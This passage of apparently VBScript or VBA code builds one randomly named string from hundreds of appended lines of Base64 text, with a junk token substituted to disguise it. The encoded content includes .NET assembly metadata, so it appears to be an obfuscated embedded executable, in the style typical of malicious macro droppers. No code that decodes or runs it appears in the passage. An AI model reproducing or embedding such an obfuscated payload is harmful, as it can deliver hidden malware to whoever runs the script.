hTpxRu = hTpxRu & "$%@#$%Diu@#$%@#$%@#$%@#$%EQcWI@#$%I@#$%@" 
hTpxRu = hTpxRu & "#$%QCeICc@#$%@#$%@#$%@#$%ocg@#$%@#$%BjqW" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%JgU6kQE@#$%@#$%C@#$%Q@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%OIU@#$%@#$%@#$%@#$%RDDkE@#$" 
hTpxRu = hTpxRu & "%w@#$%@#$%IBY@#$%@#$%@#$%@#$%XOnM@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%mBBEFH1TWKHk@#$%@#$%@#$%YTCy@#$" 
hTpxRu = hTpxRu & "%F@#$%@#$%@#$%@#$%Fzpa@#$%@#$%@#$%@#$%Jh" 
hTpxRu = hTpxRu & "EEewk@#$%@#$%@#$%QRCB7WEgkaEgEoZg@#$%@#$" 
hTpxRu = hTpxRu & "%BjqZ@#$%g@#$%@#$%ICQ@#$%@#$%@#$%@#$%WOT" 
hTpxRu = hTpxRu & "Q@#$%@#$%@#$%@#$%mEQ06LgE@#$%@#$%C@#$%J@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%OCI@#$%@#$%@#$%BzWw@#$%@#" 
hTpxRu = hTpxRu & "$%CnoRBSD4@#$%@#$%@#$%@#$%1hMOOHMD@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%gLg@#$%@#$%@#$%P4OG@#$%D+DBg@#$%RT" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%Bt@#$%g@#$%@#$%Ww@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%PIB@#$%@#$%Ch@#$%g@#$%@#$%mP3//xo@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%DB@#$%Q@#$%@#$%PQ@#$%@#$%@#$%B" 
hTpxRu = hTpxRu & "X+//9O@#$%@#$%@#$%@#$%xQ@#$%@#$%@#$%FMC@" 
hTpxRu = hTpxRu & "#$%@#$%DJ/v//X/7//xMB@#$%@#$%@#$%s@#$%Q@" 
hTpxRu = hTpxRu & "#$%@#$%CP///wj+//9P@#$%Q@#$%@#$%lw@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%D0@#$%@#$%@#$%CK@#$%g@#$%@#$%D@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%CcC@#$%@#$%C2/v//ZwE@#$%@#$%" 
hTpxRu = hTpxRu & "NwC@#$%@#$%Cq@#$%Q@#$%@#$%uQI@#$%@#$%K/9" 
hTpxRu = hTpxRu & "//+E@#$%@#$%@#$%@#$%q@#$%@#$%@#$%@#$%Nw@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%Z////pv7//+8@#$%@#$%@#$%C" 
hTpxRu = hTpxRu & "P@#$%Q@#$%@#$%1wE@#$%@#$%G4@#$%@#$%@#$%D" 
hTpxRu = hTpxRu & "M/f//jf7//z3+//8C@#$%g@#$%@#$%4v7//3v9//" 
hTpxRu = hTpxRu & "/4@#$%g@#$%@#$%5/3//w8D@#$%@#$%@#$%g@#$%" 
hTpxRu = hTpxRu & "w@#$%@#$%@#$%BY5MP///yYRBhMNI@#$%Y@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%4If///xEEewk@#$%@#$%@#$%QRBhEK" 
hTpxRu = hTpxRu & "I@#$%@#$%w@#$%@#$%@#$%fQChp@#$%@#$%@#$%G" 
hTpxRu = hTpxRu & "Ew0gIg@#$%@#$%@#$%Dj+/v//EQ061/3//y@#$%I" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%OO3+//8XEwwgDQ@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%Djg/v//c1s@#$%@#$%@#$%p6BBEFHyjWKHk@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%YTEDhD/v//Ji@#$%Y@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%KHI@#$%@#$%@#$%Y6uP7//yYREhERPlQC@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%gI@#$%@#$%@#$%@#$%Dik/v//ERQ5@#$%" 
hTpxRu = hTpxRu & "P3//y@#$%s@#$%@#$%@#$%@#$%OJP+//9zWw@#$%" 
hTpxRu = hTpxRu & "@#$%CnoEEQUfUNYoeQ@#$%@#$%BhMKI@#$%w@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%4dv7//wQRBR801ih5@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%GEwYgEg@#$%@#$%@#$%Dhf/v//EQ0ofQ@#$%@#$" 
hTpxRu = hTpxRu & "%BhMPICM@#$%@#$%@#$%@#$%4TP7//xEEewk@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%QRCB7WEQ8aEgEoZw@#$%@#$%BjpY////" 
hTpxRu = hTpxRu & "I@#$%E@#$%@#$%@#$%@#$%4KP7//wQRFREWFhEWj" 
hTpxRu = hTpxRu & "mkof@#$%@#$%@#$%Bi@#$%Z@#$%@#$%@#$%@#$%O" 
hTpxRu = hTpxRu & "@#$%/+//9zWw@#$%@#$%CnoRBHsK@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "EEQcoYw@#$%@#$%Bjq5@#$%Q@#$%@#$%IC0@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%47P3//yCz@#$%@#$%@#$%@#$%jQM@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%ETBy@#$%o@#$%@#$%@#$%@#$%FzrV" 
hTpxRu = hTpxRu & "/f//JhEEewk@#$%@#$%@#$%QRDRET1hEWERaOaRI" 
hTpxRu = hTpxRu & "BKGc@#$%@#$%@#$%Y6Gfz//y@#$%E@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%OKz9//9zWw@#$%@#$%CnoRBhEJQBD///8gH" 
hTpxRu = hTpxRu & "Q@#$%@#$%@#$%Bc6kv3//yYEEQ4fENYoeQ@#$%@#" 
hTpxRu = hTpxRu & "$%BhMUIBU@#$%@#$%@#$%@#$%4ev3//xEHHywRDR" 
hTpxRu = hTpxRu & "EQ1p4gJQ@#$%@#$%@#$%BY5Zf3//yYoeg@#$%@#$" 
hTpxRu = hTpxRu & "%Bhp@#$%Jg@#$%@#$%@#$%C@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%KHI@#$%@#$%@#$%Y6Sv3//yYREhfWExIg" 
hTpxRu = hTpxRu & "Hg@#$%@#$%@#$%Dg5/f//c1s@#$%@#$%@#$%p6EQ" 
hTpxRu = hTpxRu & "R7Cg@#$%@#$%BBEHKGU@#$%@#$%@#$%Y6KPz//y@" 
hTpxRu = hTpxRu & "#$%p@#$%@#$%@#$%@#$%FjkV/f//JgIIflw@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%p+X@#$%@#$%@#$%ChYaflw@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%oUEgMSBChh@#$%@#$%@#$%GOh@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%gCw@#$%@#$%@#$%Djo/P//c1s@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%p6BB88KHk@#$%@#$%@#$%YTBS@#$%K@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%OM78//8RBHsK@#$%@#$%@#$%EEQcoZ@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%BjrD+///ICo@#$%@#$%@#$%@#$%4s" 
hTpxRu = hTpxRu & "fz//wQRDh8U1ih5@#$%@#$%@#$%GExUgEw@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%Dia/P//BBEFHNYoew@#$%@#$%BhfaExEgE" 
hTpxRu = hTpxRu & "Q@#$%@#$%@#$%DiC/P//EQR7Cg@#$%@#$%BBEHKG" 
hTpxRu = hTpxRu & "I@#$%@#$%@#$%Y6Mg@#$%@#$%@#$%C@#$%P@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%KHI@#$%@#$%@#$%Y6YPz//yY4o/3/" 
hTpxRu = hTpxRu & "/wQRDh8M1ih5@#$%@#$%@#$%GExMgGw@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%DhD/P//c1s@#$%@#$%@#$%p6EQcfKZQTCC@#$" 
hTpxRu = hTpxRu & "%r@#$%@#$%@#$%@#$%OCz8//9zWw@#$%@#$%Cnrd" 
hTpxRu = hTpxRu & "Lg@#$%@#$%@#$%Ch+@#$%@#$%@#$%GEQR7Cw@#$%" 
hTpxRu = hTpxRu & "@#$%BIQofw@#$%@#$%BhMXERc5Bw@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "BEXKI@#$%@#$%@#$%@#$%YWCiiB@#$%@#$%@#$%G" 
hTpxRu = hTpxRu & "3cg@#$%@#$%@#$%@#$%XCi@#$%I@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%OCw@#$%@#$%@#$%@#$%S@#$%/4VDg@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%i@#$%F@#$%@#$%@#$%@#$%OBo@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%S@#$%xZ9G@#$%@#$%@#$%BDg2@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%I@#$%Y@#$%@#$%@#$%D+Dhk@#$%/gwZ@#$" 
hTpxRu = hTpxRu & "%EUJ@#$%@#$%@#$%@#$%Eg@#$%@#$%@#$%L3///+" 
hTpxRu = hTpxRu & "9+f//vf///w@#$%@#$%@#$%@#$%BJ@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%Mw@#$%@#$%@#$%Kv///9n@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%O@#$%0@#$%@#$%@#$%@#$%mI@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%WOcb///8mEgPQDg@#$%@#$%@#$%ih1" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%GKHY@#$%@#$%@#$%a4fQ0@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%Qg@#$%g@#$%@#$%@#$%Dik////csQF@#$%H" 
hTpxRu = hTpxRu & "@#$%CKHQ@#$%@#$%@#$%YMI@#$%c@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%4jv///xIE/hUN@#$%@#$%@#$%CFihy@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%GOan///8mI@#$%E@#$%@#$%@#$%@#$%4cP" 
hTpxRu = hTpxRu & "///wYq@#$%@#$%BBH@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%4@#$%@#$%@#$%C0BQ@#$%@#$%wg" 
hTpxRu = hTpxRu & "U@#$%@#$%C4@#$%@#$%@#$%@#$%l@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "BOisCJhb+CQ@#$%@#$%KB4@#$%@#$%@#$%oq@#$%" 
hTpxRu = hTpxRu & "Eor@#$%iYW/gk@#$%@#$%P4J@#$%QBvXQ@#$%@#$" 
hTpxRu = hTpxRu & "%Cio@#$%TisCJhY@#$%/gk@#$%@#$%P4J@#$%Q@#" 
hTpxRu = hTpxRu & "$%oTw@#$%@#$%Cio6KwImFv4J@#$%@#$%BvXg@#$" 
hTpxRu = hTpxRu & "%@#$%Cio@#$%bisCJhY@#$%/gk@#$%@#$%P4J@#$" 
hTpxRu = hTpxRu & "%QD+CQI@#$%/gkD@#$%Chs@#$%@#$%@#$%GKhor@" 
hTpxRu = hTpxRu & "#$%iYWFyo@#$%GisCJhYWKgBOKwImFgD+CQ@#$%@" 
hTpxRu = hTpxRu & "#$%/gkB@#$%Chf@#$%@#$%@#$%KKj4r@#$%iYW@#" 
hTpxRu = hTpxRu & "$%P4J@#$%@#$%@#$%oH@#$%@#$%@#$%Cio+KwImF" 
hTpxRu = hTpxRu & "gD+CQ@#$%@#$%KG@#$%@#$%@#$%@#$%oqPisCJhY" 
hTpxRu = hTpxRu & "@#$%/gk@#$%@#$%Chh@#$%@#$%@#$%KKl4r@#$%i" 
hTpxRu = hTpxRu & "YW@#$%P4J@#$%@#$%D+CQE@#$%/gkC@#$%ChH@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%KKk4r@#$%iYW@#$%P4J@#$%@#$%D+CQ" 
hTpxRu = hTpxRu & "E@#$%KGI@#$%@#$%@#$%oqLisCJhY@#$%KGM@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%oqTisCJhY@#$%/gk@#$%@#$%P4J@#$%Q" 
hTpxRu = hTpxRu & "@#$%oZ@#$%@#$%@#$%Cip+KwImFgD+CQ@#$%@#$%" 
hTpxRu = hTpxRu & "/gkB@#$%P4J@#$%gD+CQM@#$%/gkE@#$%Chl@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%KKj4r@#$%iYW@#$%P4J@#$%@#$%@#$%o" 
hTpxRu = hTpxRu & "Zg@#$%@#$%Cio+KwImFgD+CQ@#$%@#$%KEk@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%oqPisCJhY@#$%/gk@#$%@#$%Chn@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%KKjor@#$%iYW/gk@#$%@#$%G9o@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%KKg@#$%uKwImFg@#$%oSg@#$%@#$%CipGKwI" 
hTpxRu = hTpxRu & "mFgIDKBM@#$%@#$%@#$%YoF@#$%@#$%@#$%Bio@#" 
hTpxRu = hTpxRu & "$%@#$%C4r@#$%iYW@#$%igX@#$%@#$%@#$%GKj4r" 
hTpxRu = hTpxRu & "@#$%iYW0@#$%Y@#$%@#$%@#$%IoG@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "BiouKwImFgIoGQ@#$%@#$%BioTM@#$%I@#$%Hg@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%I@#$%@#$%BEr@#$%iYW@#$%owF" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%bOgs@#$%@#$%@#$%@#$%o@#$%Q@#" 
hTpxRu = hTpxRu & "$%@#$%Kwo4@#$%g@#$%@#$%@#$%@#$%IKBio@#$%" 
hTpxRu = hTpxRu & "@#$%DIr@#$%iYW@#$%/4VBQ@#$%@#$%Gyo@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%+KwImFisCJhYCKBo@#$%@#$%@#$%Yq" 
hTpxRu = hTpxRu & "PisCJhY@#$%/gk@#$%@#$%CgZ@#$%@#$%@#$%KKk" 
hTpxRu = hTpxRu & "or@#$%iYW/gk@#$%@#$%P4J@#$%Q@#$%oGg@#$%@" 
hTpxRu = hTpxRu & "#$%Cio@#$%GisCJhYXKg@#$%aKwImFhYq@#$%Dor" 
hTpxRu = hTpxRu & "@#$%iYW/gk@#$%@#$%Cgb@#$%@#$%@#$%KKg@#$%" 
hTpxRu = hTpxRu & "+KwImFgD+CQ@#$%@#$%KBw@#$%@#$%@#$%oqOisC" 
hTpxRu = hTpxRu & "Jhb+CQ@#$%@#$%KB0@#$%@#$%@#$%oq@#$%Dor@#" 
hTpxRu = hTpxRu & "$%iYW/gk@#$%@#$%Cge@#$%@#$%@#$%KKg@#$%TM" 
hTpxRu = hTpxRu & "@#$%M@#$%Lw@#$%@#$%@#$%@#$%M@#$%@#$%BEr@" 
hTpxRu = hTpxRu & "#$%iYW@#$%nsf@#$%@#$%@#$%Kby@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%oKBowI@#$%@#$%@#$%bOhI@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%o@#$%g@#$%@#$%KwoCex8@#$%@#$%@#$%oGbyE" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%oGKgBqKwImFisCJhYCKB4@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%oCcyI@#$%@#$%@#$%p9Hw@#$%@#$%Cio@#$" 
hTpxRu = hTpxRu & "%GisCJhYXKg@#$%aKwImFhYq@#$%EJTSkIB@#$%@" 
hTpxRu = hTpxRu & "#$%E@#$%@#$%@#$%@#$%@#$%@#$%@#$%w@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%B2NC4wLjMwMzE5@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%U@#$%b@#$%@#$%@#$%@#$%CgS@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "jfg@#$%@#$%lBI@#$%@#$%CQX@#$%@#$%@#$%jU3" 
hTpxRu = hTpxRu & "RyaW5ncw@#$%@#$%@#$%@#$%C4KQ@#$%@#$%0@#$" 
hTpxRu = hTpxRu & "%U@#$%@#$%CNVUwCILw@#$%@#$%E@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%CNHVUlE@#$%@#$%@#$%@#$%mC8@#$%@#$%FQ" 
hTpxRu = hTpxRu & "G@#$%@#$%@#$%jQmxvYg@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%C@#$%@#$%@#$%BV5WiHQkP@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%E@#$%@#$%@#$%BR@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%Dg@#$%@#$%@#$%B4@#$%@#$%@#$%CB@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%MQ@#$%@#$%@#$%HI@#$%@#$%@#$%B" 
hTpxRu = hTpxRu & "K@#$%@#$%@#$%@#$%@#$%g@#$%@#$%@#$%@#$%Y@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%F@#$%@#$%@#$%@#$%CQ@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%o@#$%@#$%@#$%@#$%C@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%C@#$%@#$%@#$%@#$%@#$%o@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%B@#$%@#$%@#$%@#$%B@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "E@#$%@#$%@#$%@#$%E@#$%@#$%@#$%@#$%@#$%w@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%U@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%oC@#$%Q@#$%@#$%@#$%@#$%@#$%@#$%Bg@#$" 
hTpxRu = hTpxRu & "%H@#$%Cc@#$%BgBW@#$%Fs@#$%BgBi@#$%Fs@#$%" 
hTpxRu = hTpxRu & "BgBo@#$%Fs@#$%BgBw@#$%Cc@#$%BgCO@#$%KI@#" 
hTpxRu = hTpxRu & "$%GwC1@#$%@#$%@#$%@#$%BgDE@#$%Ns@#$%BgDt" 
hTpxRu = hTpxRu & "@#$%Fs@#$%BgD0@#$%Ns@#$%Bg@#$%R@#$%ds@#$" 
hTpxRu = hTpxRu & "%Bg@#$%q@#$%ds@#$%BgBD@#$%ds@#$%BgBe@#$%" 
hTpxRu = hTpxRu & "ds@#$%BgB5@#$%Y0BBgCs@#$%Y0BBgC6@#$%ds@#" 
hTpxRu = hTpxRu & "$%BgDX@#$%f@#$%BBg@#$%w@#$%ls@#$%CgBO@#$" 
hTpxRu = hTpxRu & "%l4CCgCp@#$%rICDg@#$%r@#$%0MDBgCK@#$%1s@" 
hTpxRu = hTpxRu & "#$%Cg@#$%QBF4CBgDbBFs@#$%Bg@#$%HBVs@#$%B" 
hTpxRu = hTpxRu & "gBIBSc@#$%BgDKBVs@#$%Cg@#$%gBi8GBgDRBuEG" 
hTpxRu = hTpxRu & "BgD/Bts@#$%Bg@#$%UBy@#$%HDgDaB0MDBgB8CIg" 
hTpxRu = hTpxRu & "IBgCYCFs@#$%DgCdCKI@#$%BgCuCFs@#$%DgC4CM" 
hTpxRu = hTpxRu & "IIEgDNCNgIBgD0C@#$%IJDg@#$%dCaI@#$%Bg@#$" 
hTpxRu = hTpxRu & "%lCYgIBgBDCVEJBgBbCVEJDgCKCcIIDgCfCcIIBg" 
hTpxRu = hTpxRu & "DbCeQJCg@#$%sCogCCgCiCqwKzwD0Cg@#$%@#$%B" 
hTpxRu = hTpxRu & "g@#$%CC1s@#$%BgBkC1EJDgCKC6I@#$%BgDCDFs@" 
hTpxRu = hTpxRu & "#$%BgDbDFs@#$%Cg@#$%sDYgCCgBrDawKCgC/Daw" 
hTpxRu = hTpxRu & "KCgDpDawKBg@#$%IDlEJBgByDlEJBgBXD40BBgDE" 
hTpxRu = hTpxRu & "D1s@#$%BgD9D1s@#$%BgBeEls@#$%BgDdElEJBgC" 
hTpxRu = hTpxRu & "9E1s@#$%Bg@#$%DFFs@#$%Bg@#$%lFFs@#$%Bg@#" 
hTpxRu = hTpxRu & "$%2FFs@#$%DgCtFcQVDgDcFfUVDg@#$%LFvUVBg@" 
hTpxRu = hTpxRu & "#$%gFqI@#$%Cg@#$%4FqwKCgBQFogCDgBoFn0WBg" 
hTpxRu = hTpxRu & "CaFqI@#$%BgC3Fic@#$%BgDSFvkWCg@#$%JF4gC@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%BQC@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%E@#$%@#$%QC@#$%@#$%R@#$%@#$%HQI@#$" 
hTpxRu = hTpxRu & "%@#$%E0@#$%@#$%Q@#$%B@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%3@#$%kUCUQ@#$%B@#$%@#$%E@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%J4CRQJV@#$%@#$%E@#$%@#$" 
hTpxRu = hTpxRu & "%w@#$%@#$%@#$%R@#$%@#$%0@#$%JF@#$%k0@#$%" 
hTpxRu = hTpxRu & "@#$%Q@#$%F@#$%@#$%UB@#$%@#$%Da@#$%g@#$%@" 
hTpxRu = hTpxRu & "#$%TQ@#$%F@#$%@#$%w@#$%BQE@#$%@#$%OgC@#$" 
hTpxRu = hTpxRu & "%@#$%BN@#$%@#$%U@#$%Gw@#$%@#$%@#$%Q@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%wMN@#$%00@#$%Bg@#$%f@#$%@#$%@#$%B" 
hTpxRu = hTpxRu & "E@#$%@#$%g@#$%0UCWQ@#$%I@#$%CY@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%E@#$%@#$%FgDRQJN@#$%@#$%k@#$%LQ@#$%B@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%awMB@#$%E0@#$%CQ@#$%v@#$%@" 
hTpxRu = hTpxRu & "#$%E@#$%@#$%@#$%Bw@#$%wE@#$%TQ@#$%J@#$%G" 
hTpxRu = hTpxRu & "@#$%@#$%CwE@#$%@#$%HYD@#$%@#$%Bd@#$%@#$%" 
hTpxRu = hTpxRu & "k@#$%gg@#$%L@#$%Q@#$%@#$%l@#$%M@#$%@#$%F" 
hTpxRu = hTpxRu & "0@#$%DQCC@#$%DE@#$%zgPp@#$%DE@#$%5wPx@#$" 
hTpxRu = hTpxRu & "%DE@#$%+wP5@#$%DE@#$%FQQB@#$%SE@#$%Fgaq@" 
hTpxRu = hTpxRu & "#$%RE@#$%oQbY@#$%RE@#$%rQbY@#$%RE@#$%qwf" 
hTpxRu = hTpxRu & "9@#$%QY@#$%vRQ3B@#$%Y@#$%yxQ3B@#$%Y@#$%2" 
hTpxRu = hTpxRu & "BSRB@#$%Y@#$%4hSRB@#$%Y@#$%6xSRB@#$%Y@#$" 
hTpxRu = hTpxRu & "%8RQIB@#$%Y@#$%+xQIB@#$%Y@#$%@#$%xUIB@#$" 
hTpxRu = hTpxRu & "%Y@#$%CRWUB@#$%Y@#$%DRWUB@#$%Y@#$%ERWUB@" 
hTpxRu = hTpxRu & "#$%Y@#$%GRWUB@#$%Y@#$%IRWUB@#$%Y@#$%LxWU" 
hTpxRu = hTpxRu & "B@#$%Y@#$%PRWUB@#$%Y@#$%TRWUB@#$%Y@#$%VR" 
hTpxRu = hTpxRu & "WXB@#$%Y@#$%YRWXB@#$%Y@#$%bRU3B@#$%Y@#$%" 
hTpxRu = hTpxRu & "dxU3B@#$%Y@#$%gBU3B@#$%Y@#$%ihU3BF@#$%g@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%I@#$%@#$%YYU@#$%@#$%3@#$%@#$%" 
hTpxRu = hTpxRu & "E@#$%YC@#$%@#$%@#$%@#$%g@#$%kwCo@#$%+Q@#" 
hTpxRu = hTpxRu & "$%@#$%QBwI@#$%@#$%@#$%C@#$%@#$%GGF@#$%@#" 
hTpxRu = hTpxRu & "$%Nw@#$%B@#$%I@#$%g@#$%@#$%@#$%I@#$%JM@#" 
hTpxRu = hTpxRu & "$%uwPk@#$%@#$%E@#$%kC@#$%@#$%@#$%@#$%g@#" 
hTpxRu = hTpxRu & "$%ERgzB@#$%kB@#$%QBIIQ@#$%@#$%C@#$%@#$%T" 
hTpxRu = hTpxRu & "CDoELQEB@#$%Fgh@#$%@#$%@#$%I@#$%BMIVwQ3@" 
hTpxRu = hTpxRu & "#$%QE@#$%aCE@#$%@#$%@#$%g@#$%EwhnBDwB@#$" 
hTpxRu = hTpxRu & "%QB4IQ@#$%@#$%C@#$%@#$%TCH@#$%EQQEB@#$%I" 
hTpxRu = hTpxRu & "gh@#$%@#$%@#$%I@#$%JM@#$%g@#$%RG@#$%QE@#" 
hTpxRu = hTpxRu & "$%kCE@#$%@#$%@#$%g@#$%kwCTBEYB@#$%QCQNQ@" 
hTpxRu = hTpxRu & "#$%@#$%C@#$%DG@#$%r4EXgEB@#$%KQ1@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%I@#$%MYCxwRj@#$%QI@#$%sDU@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%g@#$%gwDTBGcB@#$%gD@#$%NQ@#$%@#$%C@#$%D" 
hTpxRu = hTpxRu & "G@#$%u@#$%Eb@#$%EC@#$%Mw1@#$%@#$%@#$%I@#" 
hTpxRu = hTpxRu & "$%BE@#$%6QRw@#$%QI@#$%+DU@#$%@#$%@#$%g@#" 
hTpxRu = hTpxRu & "$%@#$%Q@#$%gBYsB@#$%w@#$%INg@#$%@#$%C@#$" 
hTpxRu = hTpxRu & "%@#$%GGF@#$%@#$%Nw@#$%E@#$%Bg2@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%I@#$%JM@#$%N@#$%WT@#$%QQ@#$%KDY@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%g@#$%kwBmBZgBB@#$%@#$%8Ng@#$%@#$%C@" 
hTpxRu = hTpxRu & "#$%CT@#$%HoFRgEE@#$%EQ2@#$%@#$%@#$%I@#$%" 
hTpxRu = hTpxRu & "JM@#$%jgVG@#$%QQ@#$%TDY@#$%@#$%@#$%g@#$%" 
hTpxRu = hTpxRu & "kwCiBZ4BB@#$%BcNg@#$%@#$%C@#$%CT@#$%LYFo" 
hTpxRu = hTpxRu & "wEE@#$%Gw2@#$%@#$%@#$%I@#$%JM@#$%7gWT@#$" 
hTpxRu = hTpxRu & "%QQ@#$%fDY@#$%@#$%@#$%g@#$%kw@#$%CBuQ@#$" 
hTpxRu = hTpxRu & "%B@#$%CMNg@#$%@#$%C@#$%@#$%DCEcEMgEE@#$%" 
hTpxRu = hTpxRu & "Mg2@#$%@#$%@#$%I@#$%@#$%YYU@#$%@#$%3@#$%" 
hTpxRu = hTpxRu & "@#$%Q@#$%5DY@#$%@#$%@#$%g@#$%kwBtBkYBB@#" 
hTpxRu = hTpxRu & "$%DsNg@#$%@#$%C@#$%CT@#$%IEGRgEE@#$%Jgh@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%I@#$%BMIvQbb@#$%QQ@#$%1CE@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%g@#$%EwgIB+wBB@#$%DgIQ@#$%@#$%C@" 
hTpxRu = hTpxRu & "#$%@#$%TCDUH5@#$%@#$%E@#$%Owh@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%I@#$%JM@#$%RweY@#$%QU@#$%@#$%CI@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%g@#$%kwBqB6MBBQ@#$%QIg@#$%@#$%C@#$%C" 
hTpxRu = hTpxRu & "T@#$%H0HRgEF@#$%Bgi@#$%@#$%@#$%I@#$%JM@#" 
hTpxRu = hTpxRu & "$%k@#$%dG@#$%QU@#$%ICI@#$%@#$%@#$%g@#$%E" 
hTpxRu = hTpxRu & "RgzB@#$%kBBQB@#$%Ig@#$%@#$%C@#$%@#$%GGF@" 
hTpxRu = hTpxRu & "#$%@#$%Nw@#$%F@#$%F@#$%i@#$%@#$%@#$%I@#$" 
hTpxRu = hTpxRu & "%BYIuwcB@#$%gU@#$%XCI@#$%@#$%@#$%g@#$%kw" 
hTpxRu = hTpxRu & "DHB5MBBQBsIg@#$%@#$%C@#$%CT@#$%PQHRgEF@#" 
hTpxRu = hTpxRu & "$%HQi@#$%@#$%@#$%I@#$%JM@#$%BwhG@#$%QU@#" 
hTpxRu = hTpxRu & "$%fCI@#$%@#$%@#$%g@#$%kw@#$%aCOQ@#$%BQCM" 
hTpxRu = hTpxRu & "Ig@#$%@#$%C@#$%@#$%TCDUI@#$%QIF@#$%Jgi@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%I@#$%JM@#$%QggU@#$%gU@#$%pCI@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%g@#$%BhhQ@#$%Dc@#$%BQC0Ig@#$%@" 
hTpxRu = hTpxRu & "#$%C@#$%@#$%W@#$%F4IG@#$%IF@#$%P@#$%n@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%I@#$%JM@#$%Z@#$%nk@#$%@#$%g@#$%" 
